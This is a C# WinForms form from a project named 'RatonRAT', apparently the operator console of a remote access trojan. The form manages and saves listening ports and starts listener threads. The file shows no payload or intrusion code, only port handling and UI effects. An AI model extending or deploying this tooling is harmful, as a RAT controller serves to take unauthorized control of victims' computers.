using System;
using System.Collections.Generic;
using Server.Connection;
using System.Windows.Forms;
using System.Threading;
using Newtonsoft.Json;
using System.IO;
using System.Drawing;
using System.Drawing.Drawing2D;
using RatonRAT.Classes;
using System.Linq;
using Server.Classes;

namespace SillyRAT
{
    public partial class Form1 : Form
    {
        private Thread serverThread;
        private double opacity = 0;

        public Form1()
        {
            InitializeComponent();
            check();
            loadPorts();
        }

        private void savePorts()
        {
            var portz = new List<string>();
            foreach (var item in listBox1.Items)
            {
                portz.Add(item.ToString());
            }
            string json = JsonConvert.SerializeObject(portz, Formatting.Indented);
            File.WriteAllText(Path.Combine("Data", "ports.json"), json);
        }

        private void loadPorts()
        {
            string filePath = Path.Combine("Data", "ports.json");
            if (File.Exists(filePath))
            {
                string json = File.ReadAllText(filePath);
                var portzz = JsonConvert.DeserializeObject<List<string>>(json);
                listBox1.Items.Clear();
                foreach (var port in portzz)
                {
                    listBox1.Items.Add(port);
                }
            }
        }


        private void check()
        {
            if (listBox1.Items.Count == 0)
            {
                listBox1.Items.Add("8080");
                listBox1.Items.Add("8888");
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            Server.Classes.SFX.click();
            string input = textBox1.Text;
            if (int.TryParse(input, out int numero) && input.Length < 6)
            {
                if (!listBox1.Items.Contains(input))
                {
                    listBox1.Items.Add(input);
                }
                else
                {
                    MessageBox.Show("You already have that port", "RatonRAT", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
            else
            {
                MessageBox.Show("Please insert a valid port", "RatonRAT", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            Server.Classes.SFX.click();
            if (listBox1.SelectedItem != null)
            {
                listBox1.Items.Remove(listBox1.SelectedItem);
            }
            else
            {
                MessageBox.Show("Select a port to remove", "RatonRAT", MessageBoxButtons.OK, MessageBoxIcon.Information);
                textBox1.Clear();
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            Server.Classes.SFX.click();
            if (listBox1.Items.Count > 0)
            {
                listBox1.Items.Clear();
            }
            else
            {
                MessageBox.Show("You don't have ports", "RatonRAT", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void button4_Click(object sender, EventArgs e)
        {
            this.Opacity = 0;
            if (listBox1.Items.Count == 0)
            {
                MessageBox.Show("No ports available to listen", "RatonRAT", MessageBoxButtons.OK, MessageBoxIcon.Error);
                textBox1.Clear();
                this.Opacity = 100;
                return;
            }
            savePorts();
            Program.form2.fade();
            Program.form2.Activate();
            Program.form2.BringToFront();
            serverThread = new Thread(startListening);
            serverThread.IsBackground = true;
            serverThread.Start();
            SFX.notification();
        }

        public void klose()
        {
            this.Close();
        }

        private void startListening()
        {
            try
            {
                List<int> ports = new List<int>();

                listBox1.Invoke(new Action(() =>
                {
                    var items = listBox1.SelectedItems.Count > 0
                        ? listBox1.SelectedItems.Cast<object>()
                        : listBox1.Items.Cast<object>();

                    foreach (var item in items)
                    {
                        if (int.TryParse(item.ToString(), out int port))
                        {
                            ports.Add(port);
                        }
                    }
                }));

                if (ports.Count == 0) return;

                foreach (var port in ports)
                {
                    Listen listener = new Listen(port);
                    listener.Start();

                    Program.form2.Invoke(new Action(() =>
                    {
                        Program.form2.AddLog($"Listening on port {port}", Color.FromArgb(98, 201, 255));
                    }));
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error: {ex.Message} | Please restart ratonrat", "RatonRAT", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Application.Restart();
            }
        }


        private void createDir()
        {
            string dataDirectory = Path.Combine(Directory.GetCurrentDirectory(), "Data");
            string notesDirectory = Path.Combine(Directory.GetCurrentDirectory(), "Notes");

            if (!Directory.Exists(dataDirectory))
            {
                Directory.CreateDirectory(dataDirectory);
            }

            if (!Directory.Exists(notesDirectory))
            {
                Directory.CreateDirectory(notesDirectory);
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            LightMode lightMode = new LightMode();
            lightMode.Apply(this);
            createDir();
            this.Opacity = 0;
            this.Region = new Region(CreateRoundPath(this.ClientRectangle, 25));
            button1.Region = new Region(CreateRoundPath(button1.ClientRectangle, 10));
            button2.Region = new Region(CreateRoundPath(button2.ClientRectangle, 10));
            button4.Region = new Region(CreateRoundPath(button4.ClientRectangle, 10));
            listBox1.Region = new Region(CreateRoundPath(listBox1.ClientRectangle, 10));
            textBox1.Region = new Region(CreateRoundPath(textBox1.ClientRectangle, 10));
            timer1.Start();
        }

        private static GraphicsPath CreateRoundPath(Rectangle rect, int radius)
        {
            GraphicsPath path = new GraphicsPath();
            path.AddArc(rect.X, rect.Y, radius, radius, 180, 90);
            path.AddArc(rect.Width - radius - 1, rect.Y, radius, radius, 270, 90);
            path.AddArc(rect.Width - radius - 1, rect.Height - radius - 1, radius, radius, 0, 90);
            path.AddArc(rect.X, rect.Height - radius - 1, radius, radius, 90, 90);
            path.CloseFigure();
            return path;
        }

        private void textBox1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                button1.PerformClick();
            }
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void button5_Click(object sender, EventArgs e)
        {
            Server.Classes.SFX.click();
            Environment.Exit(0);
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            if (opacity < 1)
            {
                opacity += 0.05;  
                this.Opacity = opacity;  
            }
        }

        private void panel1_Paint(object sender, PaintEventArgs e)
        {

        }

        private void panel2_Paint(object sender, PaintEventArgs e)
        {

        }

        private void Form1_Paint(object sender, PaintEventArgs e)
        {
            if (!this.DesignMode)
            {
                using (Pen pen = new Pen(Color.White, 3)) 
                {
                    e.Graphics.SmoothingMode = SmoothingMode.AntiAlias;
                    e.Graphics.DrawPath(pen, CreateRoundPath(this.ClientRectangle, 25)); 
                }
            }
        }

        private void listBox1_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void button3_Click_1(object sender, EventArgs e)
        {
            listBox1.Items.Clear();
        }

        private void textBox1_Enter(object sender, EventArgs e)
        {
            textBox1.ForeColor = Color.White;
            textBox1.Clear();
        }

        private void button3_Click_2(object sender, EventArgs e)
        {
            listBox1.Items.Clear();
        }

        private void button5_Click_1(object sender, EventArgs e)
        {
            Environment.Exit(0);
        }

        private void textBox1_Leave(object sender, EventArgs e)
        {
        }

        private void button5_Click_2(object sender, EventArgs e)
        {
            Environment.Exit(0);
        }

        private void button3_Click_3(object sender, EventArgs e)
        {
            listBox1.Items.Clear();
        }
    }
}
